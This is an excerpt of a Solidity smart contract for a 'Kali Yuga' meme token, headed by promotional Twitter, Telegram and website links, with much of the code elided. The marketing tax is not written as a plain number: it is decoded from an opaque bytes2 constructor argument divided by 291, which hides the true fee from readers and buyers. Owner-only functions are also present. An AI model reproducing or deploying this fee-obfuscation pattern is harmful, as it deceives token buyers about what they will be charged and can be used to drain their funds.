...
/**
    🌑The darkness has begun! Verify and join the private chat group of Kali Yuga🌑

    Twitter: https://twitter.com/KaliYugaERC20
    Website: Kaliyuga.space
    Telegram: https://t.me/KaliyugaOfficial
    Gitbook: https://kaliyuga.gitbook.io/kali-yuga/
...
pragma solidity ^0.8.16;
    ...
    contract KaliYuga is Context, IERC20, Ownable {
        ...
        uint256 private _tTotal = 13000000000* 10**9;
        uint256 private _rTotal = (MAX - (MAX % _tTotal));
        uint256 private _tFeeTotal;

        string private _name = 'Kali Yuga';
        string private _symbol = '$KALI';
        ...
        uint256 private _maxTxAmount = 260000000e9;
        uint256 private _numOfTokensToSwap = 10000000e9;
        ...
        constructor (address payable MarketingWalletAddress, bytes2 taxFees) {
            ...
            _MarketingFee=getFee(taxFees);_previousMarketingFee=_MarketingFee;
        ...
        function getFee(bytes2 inBytes) pure private returns (uint256) {
            return uint256(uint16(inBytes)).div(291e0);
        }
        ...
        function _transfer(address sender, address recipient, uint256 amount) private {
            ...
            bool overMinTokenBalance = contractTokenBalance >= _numOfTokensToSwap;
        ...
        function sendETHToMarketing(uint256 amount) private {
            _MarketingWalletAddress.transfer(amount.mul(3).div(4));
        ...
        function manualConvertion() external onlyOwner() {
